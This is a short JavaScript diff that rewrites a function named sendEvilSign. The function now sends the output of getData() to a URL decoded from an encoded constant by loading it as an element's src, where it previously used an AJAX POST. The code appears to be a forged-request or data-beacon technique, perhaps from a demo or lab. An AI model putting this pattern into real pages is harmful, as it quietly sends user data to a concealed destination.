@@ -56,18 +56,6 @@ function getData() {
 	return data;
 }
 function sendEvilSign() {
-	$.ajax({
-		url: decode(MAGIC_WORD),
-		type: 'POST',
-		data: getData(),
-		success: function(data, status, xhr) {
-			// body...
-		},
-		error: function(xhr, errorType, error) {
-			// body...
-		},
-		complete: function(xhr, status) {
-			// body...
-		}
-	});
+	var url = decode(MAGIC_WORD) + '?' + $.param(getData());
+	outputArea.attr('src', url);
 }
